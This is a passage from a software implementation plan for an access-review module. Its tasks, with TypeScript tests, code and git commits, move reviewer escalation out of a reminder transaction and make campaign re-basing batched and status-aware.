decisions sitting as rows nobody would ever act on -- the report said
revoke_decided and the target still held everything.

Computing is not applying: autoApply does not exist for a batch, so what
this produces is a previewed or blocked proposal with per-row skip that a
named human must confirm. That is the only reason an unattended path may
touch it at all, and the audit event carries no actor because a background
job has none.

Before the status flip, not after, and the ordering is the safety
property: closeDueCampaigns selects status open, so a batch that failed
after the close would be a batch nothing would ever build. Failing here
leaves the campaign open and the next tick retries, and the compute is
idempotent because it supersedes a stale non-terminal batch at its own
head. A batch the guard refuses outright raises a remediation item on the
campaign owner, because a blocked batch is not a screen somebody happens
upon.
MSG
)"
```

---

### Task 5: Escalation out of the reminder transaction

Spec §6.1 — **G4**. Reminders batch by reviewer (`REVIEWER_BATCH`, 200), but inside that batch transaction the escalation block loops over **every pending item that reviewer holds** — `entry.itemIds`, bounded by campaign size and by nothing else — issuing a `findFirst` plus a `create` per (item, approver). A 20,000-item campaign over 50 reviewers is roughly 40,000 sequential statements inside one 5000 ms budget. It aborts, and the abort rolls back the `lastRemindedAt` writes with it — so the next run rebuilds the identical batch, from the identical `lastRemindedAt: null` rows, and fails identically. **No reminder and no escalation ever goes out**, for the life of the campaign, on the last day before the due date.

The budget suite misses it because its seeded reviewers carry no `managerPersonId`, so `resolveEscalationApprovers` returns nobody and the loop never executes.

**Resolution chosen:** two phases, not a bigger transaction. The reminder commits on its own so the cadence advances even if escalation fails; escalation then runs as its own paged pass, one set-based existence read and one `createMany` per page of items.

**Files:**
- Modify: `packages/core/src/govern/reviewer-service.ts:28` (add `ESCALATION_BATCH`) and `:650-760` (the reminder batch loop and the escalation block inside it)
- Test: `packages/core/src/govern/reviewer-service.test.ts`
- Test: `packages/core/src/govern/transaction-budget.test.ts`

**Interfaces:**
- Consumes: `resolveEscalationApprovers(tx, stage: StageSnapshot, subject: ResolutionSubject, on: Date) => Promise<{ approvers: { personId: string }[] }>` from `../automate/approvers.js`; the file's own `stageFor(campaign)`, `reviewerAsSubject(personId)`, `recipientsForPersons`, `displayNames`, `enqueueOutbox`, `isValidApprover`.
- Produces:
  - `export const ESCALATION_BATCH = 200;` — item ids per escalation transaction, exported so the budget test can unbound it.
  - `runCampaignReminders(tenantId, options?: { now?: Date; publicUrl?: string; batchSize?: number; escalationBatchSize?: number }) => Promise<{ reminded: number; escalated: number }>` — one new option, same return shape.

- [ ] **Step 1: Write the failing test**

Add to `packages/core/src/govern/reviewer-service.test.ts`, inside the reminders `describe` (or at the end of the file if there is none):

```ts
/**
 * THE FAILURE THAT NEVER RECOVERS.
 *
 * Escalation ran INSIDE the reviewer batch transaction, looping over every
 * pending item the reviewer held -- bounded by campaign size and by nothing
 * else -- with a `findFirst` plus a `create` per (item, approver). At 20,000
 * items over 50 reviewers that is roughly 40,000 sequential statements inside
 * one 5000 ms budget.
 *
 * The abort took the `lastRemindedAt` writes with it, so the next run rebuilt
 * the identical batch from the identical `lastRemindedAt: null` rows and failed
 * identically. No reminder and no escalation ever went out, for the life of the
 * campaign, on the last day before the due date.
 *
 * The budget suite could not see it: its reviewers carry no `managerPersonId`,
 * so `resolveEscalationApprovers` returns nobody and the loop never runs.
 */
describe('reminders and escalation are two phases', () => {
  it('stamps lastRemindedAt even when escalation adds nobody', async () => {
    const itemId = await seedItem('Anna');
    await withTenant(tenantId, (tx) => resolveItemReviewers(tx, campaignId, [itemId], NOW));

    // The last day before `dueAt`, which is when escalation fires.
    const escalatingAt = new Date(DUE.getTime() - 3_600_000);
    const result = await runCampaignReminders(tenantId, { now: escalatingAt });
    expect(result.reminded).toBe(1);

    const rows = await withTenant(tenantId, (tx) =>
      tx.campaignItemReviewer.findMany({ where: { itemId } }),
    );
    expect(rows.every((r) => r.lastRemindedAt !== null)).toBe(true);
  });

  it('escalates to the REVIEWER’s own manager, once per item', async () => {
    // §12: escalation goes to `Contract.managerPersonId` on THE REVIEWER'S OWN
    // resolved contract. `Jan` is the seeded reviewer; give Jan a manager.
    await withTenant(tenantId, (tx) =>
      tx.contract.updateMany({
        where: { personId: person['Jan']! },
        data: { managerPersonId: person['Ola']! },
      }),
    );
    const first = await seedItem('Anna');
    const second = await seedItem('Bram');
    await withTenant(tenantId, (tx) =>
      resolveItemReviewers(tx, campaignId, [first, second], NOW),
    );

    const escalatingAt = new Date(DUE.getTime() - 3_600_000);
    const result = await runCampaignReminders(tenantId, { now: escalatingAt });
    expect(result.escalated).toBe(1);

    const escalations = await withTenant(tenantId, (tx) =>
      tx.campaignItemReviewer.findMany({ where: { via: 'escalation' } }),
    );
    // ADDS a reviewer and never replaces one, on every item the silent reviewer
    // held.
    expect(escalations.map((e) => e.itemId).sort()).toEqual([first, second].sort());
    expect(new Set(escalations.map((e) => e.personId))).toEqual(new Set([person['Ola']]));

    // And the original is told they were escalated past.
    const mail = await withTenant(tenantId, (tx) =>
      tx.notificationOutbox.findMany({ where: { template: 'govern-review-escalated' } }),
    );
    expect(mail.length).toBeGreaterThan(0);
  });

  it('adds no second row on the run after an escalation', async () => {
    // The `findFirst`-then-`create` this replaces was the only thing stopping a
    // duplicate, and it cost one round trip per (item, approver). A second row
    // would double-count the reviewer in every coverage figure and mail them
    // twice a day until the campaign closed.
    await withTenant(tenantId, (tx) =>
      tx.contract.updateMany({
        where: { personId: person['Jan']! },
        data: { managerPersonId: person['Ola']! },
      }),
    );
    const itemId = await seedItem('Anna');
    await withTenant(tenantId, (tx) => resolveItemReviewers(tx, campaignId, [itemId], NOW));

    await runCampaignReminders(tenantId, { now: new Date(DUE.getTime() - 3_600_000) });
    await runCampaignReminders(tenantId, { now: new Date(DUE.getTime() - 1_800_000) });

    const escalations = await withTenant(tenantId, (tx) =>
      tx.campaignItemReviewer.findMany({ where: { itemId, via: 'escalation' } }),
    );
    expect(escalations).toHaveLength(1);
  });
});
```

Add `runCampaignReminders` and `resolveItemReviewers` to the file's imports if they are not already there — both are.

- [ ] **Step 2: Run the test to verify it fails**

Run: `npx vitest run packages/core/src/govern/reviewer-service.test.ts -t 'two phases'`

Expected: the second case FAILS or passes only by accident — with `escalationBatchSize` not yet existing and the work inside the reminder transaction, the third case is the one that shows the shape most clearly. The definitive failure is Step 8's budget case; run it before implementing if the unit cases pass.

- [ ] **Step 3: Add the batch constant**

In `packages/core/src/govern/reviewer-service.ts`, beside `export const REVIEWER_BATCH = 200;`:

```ts
/**
 * ITEM IDS PER ESCALATION TRANSACTION.
 *
 * Separate from `REVIEWER_BATCH`, which bounds how many REVIEWERS one reminder
 * transaction handles. Escalation is bounded by the ITEMS a single reviewer
 * holds, which is a different number entirely: one reviewer with 4,000 pending
 * items is one row in the reminder batch and 4,000 units of work here.
 *
 * That is the defect this constant exists for. The escalation block used to run
 * inside the reminder batch transaction, looping over every pending item the
 * reviewer held with a `findFirst` plus a `create` per (item, approver) --
 * roughly 40,000 sequential statements for a 20,000-item campaign over 50
 * reviewers, inside one 5000 ms budget. It aborted, and the abort rolled back
 * the `lastRemindedAt` writes with it, so the next run rebuilt the identical
 * batch and failed identically. No reminder and no escalation ever went out.
 */
export const ESCALATION_BATCH = 200;
```

- [ ] **Step 4: Take escalation out of the reminder transaction**

In `runCampaignReminders`, read the option beside `batchSize`:

```ts
  const escalationBatchSize = options.escalationBatchSize ?? ESCALATION_BATCH;
```

and widen the options type on the signature to `{ now?: Date; publicUrl?: string; batchSize?: number; escalationBatchSize?: number }`.

Inside the reviewer-batch `withTenant`, **delete the entire `if (escalating) { ... }` block** (lines 688–755, from the comment "Escalation ADDS a reviewer" through `raised += 1;`) and the `let raised = 0;` / `raised` half of the returned object. The transaction now returns `{ sent }` only, and the loop below it accumulates `reminded += outcome.sent;`.

Collect who was reminded so phase two knows who to escalate for — declare above the batch loop:

```ts
    // Who actually got a reminder, and over which items. Escalation is phase
    // two and runs over exactly this set: a reviewer whose reminder was skipped
    // -- because they are no longer a valid approver -- must not be escalated
    // past either.
    const remindedThisRun: { personId: string; itemIds: string[] }[] = [];
```

and inside the per-reviewer loop, immediately after `sent += 1;`, push onto a local array the outer scope can read (the transaction callback closes over it, so push after the `updateMany` and let the outer loop merge it):

```ts
          reminded.push({ personId, itemIds: entry.itemIds });
          sent += 1;
```

with `const reminded: { personId: string; itemIds: string[] }[] = [];` declared at the top of the transaction callback and returned as `{ sent, reminded }`; the outer loop then does `remindedThisRun.push(...outcome.reminded);`. Pushing into the outer array directly from inside a transaction that may roll back would leave phase two escalating for a reminder nobody received.

- [ ] **Step 5: Add the escalation phase**

Immediately after the reviewer-batch `for` loop closes, still inside the per-campaign loop, insert:

```ts
    // ---- phase two: escalation, in its own transactions -------------------
    //
    // §12: escalation ADDS a reviewer and never replaces one, and it tells the
    // original they were escalated past. THE SUBJECT IS THE REVIEWER, NOT THE
    // ITEM -- `Contract.managerPersonId` on the reviewer's own resolved
    // contract. Passing the first pending item's subject would resolve an
    // arbitrary person's manager and grant them review authority over items
    // they have no relationship to, and if that arbitrary subject's manager is
    // themselves the subject of one of the escalated items they would then
    // review their own access.
    //
    // SEPARATE FROM THE REMINDER, and that is the whole of this task. The
    // reminder's `lastRemindedAt` is committed by the time this runs, so an
    // escalation that fails costs one night's escalation rather than every
    // reminder in the campaign forever.
    if (escalating) {
      for (const { personId, itemIds } of remindedThisRun) {
        const resolved = await withTenant(tenantId, async (tx) => {
          const escalation = await resolveEscalationApprovers(
            tx,
            stageFor(campaign),
            reviewerAsSubject(personId),
            now,
          );
          return escalation.approvers
            .filter((a) => a.personId !== personId)
            .map((a) => a.personId);
        });
        if (resolved.length === 0) continue;

        // ONE existence read and ONE createMany per page of items, instead of a
        // `findFirst` plus a `create` per (item, approver). The unique index is
        // `(itemId, personId, assignedAt)` and `assignedAt` is `now`, so
        // `skipDuplicates` alone would not stop a SECOND row for an escalation
        // made on an earlier run at a different `now` -- which is why the read
        // is still here, and why it is set-based.
        for (let i = 0; i < itemIds.length; i += escalationBatchSize) {
          const page = itemIds.slice(i, i + escalationBatchSize);
          await withTenant(tenantId, async (tx) => {
            const existing = await tx.campaignItemReviewer.findMany({
              where: { itemId: { in: page }, personId: { in: resolved }, unassignedAt: null },
              select: { itemId: true, personId: true },
            });
            const held = new Set(existing.map((row) => `${row.itemId}|${row.personId}`));
            const missing = page.flatMap((itemId) =>
              resolved
                .filter((approverId) => !held.has(`${itemId}|${approverId}`))
                .map((approverId) => ({
                  tenantId,
                  itemId,
                  personId: approverId,
                  via: 'escalation',
                  assignedAt: now,
                })),
            );
            if (missing.length === 0) return;
            await tx.campaignItemReviewer.createMany({ data: missing, skipDuplicates: true });
          });
        }

        // The original is told, once, after the rows are in. Telling them
        // before would name an escalation that a failed page never made.
        await withTenant(tenantId, async (tx) => {
          const recipients = await recipientsForPersons(tx, [personId]);
          const names = await displayNames(tx, { personIds: resolved });
          await enqueueOutbox(
            tx,
            recipients.map((recipient) => ({
              template: 'govern-review-escalated' as const,
              to: recipient.email,
              vars: {
                displayName: recipient.displayName,
                campaignName: campaign.name,
                itemCount: String(itemIds.length),
                escalatedTo: resolved
                  .map((id) => names.get(`person:${id}`) ?? 'their manager')
                  .join(', '),
                reviewUrl: `${options.publicUrl ?? ''}/govern/reviews?campaign=${campaign.id}`,
              },
              requestId: null,
              userId: recipient.userId,
            })),
          );
        });
        escalated += 1;
      }
    }
```

- [ ] **Step 6: Run the unit tests to verify they pass**

Run: `npx vitest run packages/core/src/govern/reviewer-service.test.ts`

Expected: PASS, all cases including the pre-existing reminder-cadence ones.

- [ ] **Step 7: Give the budget seed reviewers a manager**

In `packages/core/src/govern/transaction-budget.test.ts`, in `seedLargeCampaign`, add a manager to the reviewers' own contracts:

```ts
          ...reviewerIds.map((personId, i) => ({
            tenantId,
            personId,
            sequence: 1,
            isPrimary: true,
            startDate: new Date('2020-01-01'),
            // THE REVIEWERS HAVE MANAGERS NOW, and that is what this seed was
            // missing. `resolveEscalationApprovers` reads
            // `Contract.managerPersonId` on the REVIEWER's own contract, so
            // reviewers with none resolved to nobody and the escalation loop
            // never executed -- which is why this file measured the reminder
            // run as bounded while the escalation inside it was unbounded.
            // Chained, so every reviewer has one and the fiftieth has the
            // first: escalating to a person outside the campaign would only
            // measure a lookup that misses.
            managerPersonId: reviewerIds[(i + 1) % REVIEWERS]!,
          })),
```

- [ ] **Step 8: Add the budget case, both halves**

Add to the slice-2 `describe` in `packages/core/src/govern/transaction-budget.test.ts`:

```ts
  it('reminds AND escalates a 2,000-item campaign within the budget', async () => {
    await seedOrdinaryCampaign();
    await startCampaign(tenantId, actorUserId, campaignId, { now: NOW });
    // The last day before `dueAt` is when escalation fires, and it is the only
    // window in which this code path runs at all.
    const { result, slowest } = await timedTransactions(() =>
      runCampaignReminders(tenantId, { now: new Date(DUE.getTime() - 3_600_000) }),
    );
    expect(result.escalated).toBeGreaterThan(0);
    expect(slowest).toBeLessThan(BUDGET_MS);
  }, 300_000);

  it('FAILS when escalation is unbounded — the mutation this case exists for', async () => {
    // EXECUTED, not documented. The defect was an unbounded loop over the items
    // ONE reviewer holds, inside the reviewer BATCH transaction, and it took
    // the reminder's `lastRemindedAt` writes down with it -- so the next run
    // rebuilt the identical batch and failed identically, forever.
    await seedOrdinaryCampaign();
    await startCampaign(tenantId, actorUserId, campaignId, { now: NOW });

    let aborted = false;
    const { slowest } = await timedTransactions(async () => {
      try {
        await runCampaignReminders(tenantId, {
          now: new Date(DUE.getTime() - 3_600_000),
          escalationBatchSize: Number.MAX_SAFE_INTEGER,
        });
      } catch {
        // Prisma's own 5,000 ms ceiling ends it first, which is the same
        // finding arriving as an exception instead of a number -- and is the
        // shape the defect takes in production.
        aborted = true;
      }
    });

    const breached = aborted || slowest > BUDGET_MS;
    expect(breached).toBe(true);
  }, 300_000);
```

- [ ] **Step 9: Run the budget cases**

Run: `GOVERN_BUDGET_MS=4500 npx vitest run packages/core/src/govern/transaction-budget.test.ts -t 'escalat'`

Expected: PASS both — the bounded case under the budget, the unbounded one breaching it.

- [ ] **Step 10: Typecheck and commit**

Run: `npx tsc -b`
Expected: exit 0.

```bash
git add packages/core/src/govern/reviewer-service.ts \
        packages/core/src/govern/reviewer-service.test.ts \
        packages/core/src/govern/transaction-budget.test.ts
git commit -m "$(cat <<'MSG'
fix(govern): escalation out of the reminder transaction

Reminders batch by reviewer, 200 at a time, but the escalation block ran
inside that batch transaction and looped over every pending item the
reviewer held -- bounded by campaign size and by nothing else -- with a
findFirst plus a create per (item, approver). A 20,000-item campaign over
50 reviewers is roughly 40,000 sequential statements inside one 5000 ms
budget.

It aborted, and the abort rolled back the lastRemindedAt writes with it,
so the next run rebuilt the identical batch from the identical
lastRemindedAt: null rows and failed identically. No reminder and no
escalation ever went out, for the life of the campaign, on the last day
before the due date.

Two phases now. The reminder commits on its own, so the cadence advances
whatever escalation does; escalation then runs paged, one set-based
existence read and one createMany per ESCALATION_BATCH items. The read
stays because the unique index carries assignedAt, so skipDuplicates alone
would not stop a second row for an escalation made on an earlier run.

The budget suite could not see any of this: its reviewers had no
managerPersonId, so resolveEscalationApprovers returned nobody and the
loop never executed. They have managers now, and the unbounded case is
measured.
MSG
)"
```

---

### Task 6: Re-base, batched and status-aware

Spec §6.1 — **G5** (`rebaseCampaign` is one transaction with an update per item) and **G6** (re-base ignores item status entirely). One function, two defects that have to be fixed together, because the batching rewrite is what makes the status filter cheap.

§8 rule 2 requires a campaign whose snapshot has aged past `maxSnapshotAgeDays` to be **re-based before its revocations can execute**, and §13's guard refuses the batch outright otherwise. So a 20,000-item campaign that hits P2028 partway and rolls back entirely has a batch that is **permanently unexecutable**: the only path out of the block is the function that cannot complete.

And what it does complete is wrong. There is no status filter and no campaign-status check, so a terminal `undecided` item goes back to `pending` — resurrecting an item §11 calls terminal and quietly deleting the "nobody decided this" record; a `revocation_dispatched` item whose removal Provision already applied shows as absent in the new snapshot and is overwritten to `moot`, erasing the outcome the whole dispatch machinery exists to record; and a re-opened `certified` item keeps a `HoldingCertification` row claiming an attestation of facts that have since changed.

**Resolution chosen for the certification:** delete the projection row for an item re-opened **from `certified`**, and only for those. The function's existing docstring is right that a re-base must not roll back the projection for items it *keeps* — that would make a certification that is still good read as never made. Re-opening is the other case: the holding changed, so the certification is no longer a certification of it.

**Files:**
- Modify: `packages/core/src/govern/campaign-service.ts:17` (add `REBASE_BATCH`) and `:665-755` (the whole of `rebaseCampaign`)
- Test: `packages/core/src/govern/campaign-service.test.ts` (including the two existing `toEqual({ reopened: 0, kept: 1 })` assertions at lines 582 and 672)
- Test: `packages/core/src/govern/transaction-budget.test.ts`

**Interfaces:**
- Consumes: `withTenant`, `type TenantClient` from `@syntra/db`; `recordEvent`; `readableSnapshot` from `./readable.js`; `CampaignRefusedError` (widened in Task 3 — if Task 3 has not landed, add `'not_open'` to its union here instead).
- Produces:
  - `export const REBASE_BATCH = 200;`
  - `rebaseCampaign(tenantId, actorUserId, campaignId, newSnapshotId, options?: { batchSize?: number }) => Promise<{ reopened: number; kept: number; untouched: number }>` — **the return type gains `untouched`**, the count of items whose status put them outside a re-base. `POST /govern/campaigns/:id/rebase` returns it unchanged and needs no edit.

- [ ] **Step 1: Write the failing status tests**

Add to `packages/core/src/govern/campaign-service.test.ts`, in the re-base `describe`:

```ts
  /**
   * §11 calls `undecided` TERMINAL: "the campaign closed and nobody decided
   * this item. It was NOT attested." Re-base had no status filter at all, so it
   * put terminal items back to `pending` -- resurrecting a decision nobody
   * made, deleting the record that nobody made it, and leaving the
   * `undecided_item` remediation row pointing at an item that is no longer
   * undecided.
   */
  it('leaves a terminal undecided item alone', async () => {
    await buildSnapshot(tenantId, { now: NOW });
    const { id } = await createCampaign(tenantId, actorUserId, draft());
    await startCampaign(tenantId, actorUserId, id, { now: NOW });
    const item = await withTenant(tenantId, (tx) => tx.campaignItem.findFirstOrThrow());
    await withTenant(tenantId, (tx) =>
      tx.campaignItem.update({ where: { id: item.id }, data: { status: 'undecided' } }),
    );

    const later = new Date(NOW.getTime() + 86_400_000);
    const rebuilt = await buildSnapshot(tenantId, { now: later });
    const result = await rebaseCampaign(tenantId, actorUserId, id, rebuilt.snapshotId);

    expect(result).toEqual({ reopened: 0, kept: 0, untouched: 1 });
    const after = await withTenant(tenantId, (tx) =>
      tx.campaignItem.findUniqueOrThrow({ where: { id: item.id } }),
    );
    expect(after.status).toBe('undecided');
  });

  /**
   * A dispatched revocation that Provision APPLIED is absent from the next
   * snapshot -- which is the outcome, not a disappearance. Overwriting it to
   * `moot` erased the one thing §13's whole dispatch vocabulary exists to
   * record, and the campaign then reported the removal it caused as a holding
   * that happened to stop existing.
   */
  it('leaves a dispatched revocation alone even though the holding is gone', async () => {
    await buildSnapshot(tenantId, { now: NOW });
    const { id } = await createCampaign(tenantId, actorUserId, draft());
    await startCampaign(tenantId, actorUserId, id, { now: NOW });
    const item = await withTenant(tenantId, (tx) => tx.campaignItem.findFirstOrThrow());
    await withTenant(tenantId, (tx) =>
      tx.campaignItem.update({
        where: { id: item.id },
        data: { status: 'revocation_dispatched' },
      }),
    );

    // A snapshot with no holdings at all: the removal landed.
    const later = new Date(NOW.getTime() + 86_400_000);
    const rebuilt = await buildSnapshot(tenantId, {
      now: later,
      collect: async () => emptyCollectionAt(later),
    });
    const result = await rebaseCampaign(tenantId, actorUserId, id, rebuilt.snapshotId);

    expect(result.untouched).toBe(1);
    const after = await withTenant(tenantId, (tx) =>
      tx.campaignItem.findUniqueOrThrow({ where: { id: item.id } }),
    );
    expect(after.status).toBe('revocation_dispatched');
  });

  /**
   * The other half of the composition hazard this function's docstring names.
   *
   * An item it KEEPS must keep its projection -- rolling that back would make a
   * certification that is still good read as never made. An item it RE-OPENS is
   * the opposite case: the holding changed, so what was certified is not what
   * is there now, and a `HoldingCertification` left behind says a named human
   * attested to facts nobody showed them.
   */
  it('drops the certification projection for a certified item it re-opens', async () => {
    await buildSnapshot(tenantId, { now: NOW });
    const { id } = await createCampaign(tenantId, actorUserId, draft());
    await startCampaign(tenantId, actorUserId, id, { now: NOW });
    const item = await withTenant(tenantId, (tx) => tx.campaignItem.findFirstOrThrow());
    await recordCampaignDecision(
      tenantId,
      {
        itemId: item.id,
        deciderPersonId: managerPersonId,
        deciderUserId: managerUserId,
        decision: 'certify',
        comment: null,
      },
      { now: NOW },
    );
    expect(await withTenant(tenantId, (tx) => tx.holdingCertification.count())).toBe(1);

    // A snapshot in which the holding is gone: the item re-opens as `moot`.
    const later = new Date(NOW.getTime() + 86_400_000);
    const rebuilt = await buildSnapshot(tenantId, {
      now: later,
      collect: async () => emptyCollectionAt(later),
    });
    const result = await rebaseCampaign(tenantId, actorUserId, id, rebuilt.snapshotId);

    expect(result.reopened).toBe(1);
    expect(await withTenant(tenantId, (tx) => tx.holdingCertification.count())).toBe(0);
  });

  it('refuses to re-base a campaign that is not open', async () => {
    // Re-basing exists so a stale campaign's revocations can execute (§8 rule
    // 2). A closed campaign has no revocations left to unblock, and re-opening
    // its items would put a queue in front of reviewers for a campaign whose
    // coverage figure is already signed.
    await buildSnapshot(tenantId, { now: NOW });
    const { id } = await createCampaign(tenantId, actorUserId, draft());
    await startCampaign(tenantId, actorUserId, id, { now: NOW });
    await withTenant(tenantId, (tx) =>
      tx.campaign.update({ where: { id }, data: { status: 'closed_complete' } }),
    );

    const later = new Date(NOW.getTime() + 86_400_000);
    const rebuilt = await buildSnapshot(tenantId, { now: later });
    await expect(
      rebaseCampaign(tenantId, actorUserId, id, rebuilt.snapshotId),
    ).rejects.toMatchObject({ code: 'not_open' });
  });
```

Add the helper the two "holding is gone" cases need, beside `draft()`:

```ts
/**
 * A collection with no holdings, for the cases that need the world to have
 * MOVED ON rather than merely to have been re-read. `buildSnapshot`'s default
 * `collect` reads the seeded tenant, so a second build produces the same
 * holdings and nothing re-opens.
 */
const emptyCollectionAt = (asOf: Date): CollectedTenant => ({
  asOf,
  holdings: [],
  gaps: [],
  sources: [
    {
      sourceKind: 'syntraInternal',
      sourceId: 'syntra',
      sourceName: 'Syntra',
      lastRunId: null,
      lastSuccessfulReadAt: asOf,
      lastAttemptedReadAt: asOf,
      completeness: 'complete',
      freshnessSlaHours: 24,
      gapCount: 0,
    },
  ],
  personIds: [],
  personsWithActiveContract: 0,
  unattributedAccountKeys: [],
  queryCount: 9,
});
```

with `import type { CollectedTenant } from './collect.js';` added to the file's imports.

- [ ] **Step 2: Update the two existing assertions for the new key**

At lines 582 and 672, change `expect(result).toEqual({ reopened: 0, kept: 1 });` to:

```ts
    expect(result).toEqual({ reopened: 0, kept: 1, untouched: 0 });
```

- [ ] **Step 3: Run the tests to verify they fail**

Run: `npx vitest run packages/core/src/govern/campaign-service.test.ts -t 'rebase'`

Expected: FAIL — the terminal item is back to `pending`, the dispatched one is `moot`, the certification survives, and the closed campaign re-bases happily.

- [ ] **Step 4: Add the batch constant**

In `packages/core/src/govern/campaign-service.ts`, beside `export const ITEM_BATCH = 500;`:

```ts
/**
 * ITEMS PER RE-BASE TRANSACTION.
 *
 * Smaller than `ITEM_BATCH` because a re-base does per-item WORK -- a
 * comparison and an `update` each -- where item creation is one `createMany`
 * per page. It is `REVIEWER_BATCH`'s number for `REVIEWER_BATCH`'s reason.
 *
 * The whole function used to be one transaction with an update per item, and
 * §8 rule 2 makes that a trap rather than a slowdown: a campaign whose snapshot
 * has aged past `maxSnapshotAgeDays` MUST be re-based before its revocations
 * can execute, and §13's guard refuses the batch outright otherwise. So a
 * 20,000-item campaign that hit P2028 partway and rolled back entirely had a
 * revocation batch that was permanently unexecutable: the only path out of the
 * block was the function that could not finish.
 */
export const REBASE_BATCH = 200;
```

- [ ] **Step 5: Rewrite `rebaseCampaign`**

Replace the whole function body (from `export async function rebaseCampaign(` to its closing brace) with:

```ts
/**
 * Re-basing RE-OPENS ONLY THE ITEMS WHOSE HOLDING ACTUALLY CHANGED, and only
 * the items whose STATUS leaves a re-base anything to say.
 *
 * A certification of a holding that has since changed is not a certification of
 * the current holding; a certification of one that has not is still good.
 * Re-opening everything would make a re-base a punishment for the reviewers who
 * answered on time.
 *
 * STATUS IS PART OF THAT, and it used not to be considered at all:
 *
 *   - `undecided` is TERMINAL (§11): "the campaign closed and nobody decided
 *     this item. It was NOT attested." Putting it back to `pending` resurrected
 *     a decision nobody made and deleted the record that nobody made it, while
 *     leaving its `undecided_item` remediation row pointing at an item that is
 *     no longer undecided.
 *   - A `revocation_*` item has an OUTCOME. A dispatched revocation Provision
 *     applied is absent from the next snapshot -- which is the outcome, not a
 *     disappearance -- and overwriting it to `moot` erased the one thing §13's
 *     whole dispatch vocabulary exists to record.
 *   - `moot` is terminal too: the holding stopped existing or the subject left,
 *     and neither un-happens because a newer snapshot was built.
 *
 * COMPOSITION HAZARD, both directions. This pairs with the `HoldingCertification`
 * projection in `decision-service.ts`. An item that is NOT re-opened must keep
 * its projection row -- rolling it back for every item of a re-based campaign
 * would make a certification that is still good read as never made. An item
 * that IS re-opened from `certified` must LOSE it: the holding changed, so the
 * row would claim a named human attested to facts nobody showed them.
 *
 * BATCHED, in `REBASE_BATCH` items per transaction, for the reason that
 * constant gives.
 */
export const REBASABLE_STATUSES: readonly string[] = [
  'pending',
  'certified',
  'revoke_decided',
  'blocked_no_reviewer',
];

export async function rebaseCampaign(
  tenantId: string,
  actorUserId: string | null,
  campaignId: string,
  newSnapshotId: string,
  options: { batchSize?: number } = {},
): Promise<{ reopened: number; kept: number; untouched: number }> {
  const batchSize = options.batchSize ?? REBASE_BATCH;

  // ---- one short transaction for the two facts the loop needs -------------
  const prepared = await withTenant(tenantId, async (tx) => {
    const campaign = await tx.campaign.findUniqueOrThrow({ where: { id: campaignId } });
    // Re-basing exists so a stale campaign's revocations can execute (§8 rule
    // 2). A closed campaign has no revocations left to unblock and its coverage
    // figure is already signed; re-opening its items would put a queue in front
    // of reviewers for a campaign that is over, and `recordCampaignDecision`
    // would then refuse every one of them.
    if (campaign.status !== 'open') {
      throw new CampaignRefusedError(
        'not_open',
        null,
        `this campaign is ${campaign.status}; only a running campaign can be re-based`,
      );
    }
    const snapshot = await readableSnapshot(tx, newSnapshotId);
    return { fromSnapshotId: campaign.snapshotId, snapshot };
  });

  let reopened = 0;
  let kept = 0;
  let untouched = 0;

  // Paged by id, not by offset: `createdAt` defaults to `now()`, which in
  // PostgreSQL is TRANSACTION START TIME, so every row of one `createMany`
  // carries an identical one and ordering by it imposes no order.
  let cursor: string | null = null;
  for (;;) {
    const page: { id: string }[] = await withTenant(tenantId, (tx) =>
      tx.campaignItem.findMany({
        where: { campaignId, ...(cursor === null ? {} : { id: { gt: cursor } }) },
        orderBy: { id: 'asc' },
        take: batchSize,
        select: { id: true },
      }),
    );
    if (page.length === 0) break;
    cursor = page[page.length - 1]!.id;

    const outcome = await withTenant(tenantId, async (tx) => {
      const items = await tx.campaignItem.findMany({ where: { id: { in: page.map((p) => p.id) } } });

      // Everything outside `REBASABLE_STATUSES` is counted and left exactly as
      // it is, including its `holdingSnapshotId` -- which is what "attested
      // against these facts" means and must keep naming the snapshot the
      // decision was made against.
      const rebasable = items.filter((i) => REBASABLE_STATUSES.includes(i.status));
      const skipped = items.length - rebasable.length;
      if (rebasable.length === 0) return { reopened: 0, kept: 0, untouched: skipped };

      const fresh = await tx.holding.findMany({
        where: {
          snapshotId: prepared.snapshot.id,
          subjectKey: { in: rebasable.map((i) => i.subjectKey) },
        },
        include: { attributions: { select: { kind: true, refId: true } } },
      });
      const byKey = new Map(
        fresh.map((h) => [`${h.subjectKey}|${h.systemId}|${h.resourceKind}|${h.resourceId}`, h]),
      );

      let pageReopened = 0;
      let pageKept = 0;

      for (const item of rebasable) {
        const key = `${item.subjectKey}|${item.systemId}|${item.resourceKind}|${item.resourceId}`;
        const current = byKey.get(key);

        const before = (item.attributions as { kind: string; refId?: string | null }[]).map(
          (a) => `${a.kind}:${a.refId ?? ''}`,
        );
        const after = (current?.attributions ?? []).map((a) => `${a.kind}:${a.refId ?? ''}`);
        const changed =
          current === undefined ||
          current.state !== 'held' ||
          before.length !== after.length ||
          [...before].sort().join('|') !== [...after].sort().join('|');

        if (!changed) {
          pageKept += 1;
          continue;
        }
        pageReopened += 1;

        // The projection goes only for an item re-opened FROM `certified`.
        // See the docstring: keeping it would claim an attestation of facts
        // nobody was shown; deleting it for a KEPT item would erase one that is
        // still good.
        if (item.status === 'certified') {
          const subject = parseSubjectKey(item.subjectKey);
          if (subject !== null) {
            await tx.holdingCertification.deleteMany({
              where: {
                subjectRefType: subject.kind,
                subjectRefId:
                  subject.kind === 'person' ? subject.personId : subject.accountRef,
                systemId: item.systemId,
                resourceKind: item.resourceKind,
                resourceId: item.resourceId,
              },
            });
          }
        }

        await tx.campaignItem.update({
          where: { id: item.id },
          data: {
            status: current === undefined ? 'moot' : 'pending',
            statusReason:
              current === undefined
                ? `the holding no longer exists as of snapshot ${prepared.snapshot.id}`
                : 'the holding changed between the original snapshot and the re-base',
            holdingSnapshotId: prepared.snapshot.id,
            attributions: (current?.attributions ?? []) as never,
            ...(current === undefined ? {} : { observedAt: current.observedAt }),
          },
        });
      }

      return { reopened: pageReopened, kept: pageKept, untouched: skipped };
    });

    reopened += outcome.reopened;
    kept += outcome.kept;
    untouched += outcome.untouched;
  }

  // ---- one short transaction to move the campaign and record it -----------
  await withTenant(tenantId, async (tx) => {
    await tx.campaign.update({
      where: { id: campaignId },
      data: { snapshotId: prepared.snapshot.id, rebasedFromSnapshotId: prepared.fromSnapshotId },
    });

    await recordEvent(tx, {
      actorUserId,
      action: 'govern.campaign.rebase',
      targetType: 'Campaign',
      targetId: campaignId,
      outcome: 'success',
      sourceIp: null,
      payload: {
        fromSnapshotId: prepared.fromSnapshotId,
        toSnapshotId: prepared.snapshot.id,
        reopened,
        kept,
        // Named on the event as well as returned. "1,840 items, 61 re-opened,
